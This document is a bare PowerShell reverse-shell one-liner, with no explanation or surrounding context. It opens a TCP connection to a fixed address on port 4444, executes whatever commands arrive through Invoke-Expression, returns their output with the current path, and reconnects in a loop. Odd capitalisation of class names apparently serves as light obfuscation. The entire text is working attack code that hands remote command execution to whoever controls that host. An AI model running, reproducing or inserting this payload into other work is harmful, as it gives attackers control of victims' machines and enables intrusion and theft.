do{;$v = 4;$a = New-Object SyStem.NeT.sockeTs.TCPClieNt("196.168.1.151",4444)
;$b = $a.GetStream();[byte[]]$c = 0..65535|%{0};while(($d = $b.Read($c, 0, $c.Length)) -ne 0){;$e = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($c,0, $d)
;$f = (iex $e 2>&1 | Out-String );$g = $f + (pwd).Path + '> ';$h = ([text.encoding]::ASCII).GetBytes($g);$b.Write($h,0,$h.Length);$b.Flush()};$a.Close();Sleep 10}while ($v -le 5)
